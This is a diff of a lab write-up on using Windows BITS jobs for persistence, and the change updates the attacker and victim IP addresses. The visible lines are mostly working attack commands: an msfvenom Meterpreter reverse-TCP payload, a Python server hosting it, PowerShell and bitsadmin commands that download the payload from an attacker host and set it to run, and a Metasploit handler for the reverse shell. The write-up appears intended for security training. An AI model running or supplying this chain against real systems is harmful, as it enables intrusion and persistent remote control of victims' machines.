@@ -27,16 +27,16 @@ Since BITS jobs are often allowed by host firewalls and do not create obvious ne
 ### 3.1. Lab Setup
 
 This attack is demonstrated in a controlled lab environment using VMware Workstation. The setup consists of:
-- **Attacker:** Kali Linux : 192.168.1.131 (running Metasploit Framework)
-- **Victim:** Windows 10: 192.168.1.129 (BITS service enabled)
-- **Network Configuration:** Host-only or bridged network mode to allow direct communication
+- **Attacker:** Kali Linux : 192.168.100.10 (running Metasploit Framework)
+- **Victim:** Windows 10: 192.168.1.11 (BITS service enabled)
+- **Network Configuration:** NAT
 
 ### 3.2. Attack Execution
 
 #### Step 1: Using Metasploit to create payload
 On Kali Linux, open a terminal and generate a malicious executable:
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.131 LPORT=4444 -f exe > /tmp/payload.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f exe > /tmp/payload.exe
 ```
 #### Step 3: Send Payload through Python HTTP Server
 ```bash
@@ -47,7 +47,7 @@ python3 -m http.server 8080
 
 On the compromised Windows machine, the attacker executes PowerShell commands to create a persistent BITS job:
 ```powershell
-$job = Start-BitsTransfer -Source "http://192.168.1.131:8080/payload.exe" -Destination "C:\Users\Public\payload.exe"
+$job = Start-BitsTransfer -Source "http://192.168.100.10:8080/payload.exe" -Destination "C:\Users\Public\payload.exe"
 bitsadmin /create /download MaliciousJob
 bitsadmin /addfile MaliciousJob "http://attacker-server/payload.exe" "C:\Users\Public\payload.exe"
 bitsadmin /setnotifycmdline MaliciousJob "C:\Users\Public\payload.exe" ""
@@ -76,7 +76,7 @@ To capture the reverse shell, the attacker sets up a Metasploit listener:
 msfconsole
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
-set LHOST 192.168.1.131
+set LHOST 192.168.100.10
 set LPORT 4444
 exploit
 ```
